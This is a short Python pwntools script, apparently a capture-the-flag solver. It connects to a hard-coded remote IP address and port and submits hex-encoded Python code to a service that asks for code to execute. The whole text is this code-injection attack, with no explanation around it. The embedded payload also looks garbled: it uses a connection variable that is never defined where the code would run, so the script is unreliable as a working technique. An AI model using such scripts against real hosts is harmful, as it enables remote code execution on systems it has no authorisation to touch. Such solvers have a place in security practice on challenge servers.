from pwn import *
payload = '''
sig = bytes.fromhex(r.recvlineS().strip().split(' ')[1])
r.sendlineafter(b"Read Check\\n", sig)
r.interactive()
'''

signatures_hex = payload.encode().hex()
io = remote("15.165.79.74",48085)
io.sendlineafter(b'python code to execute (hex): ', signatures_hex.encode())
io.interactive()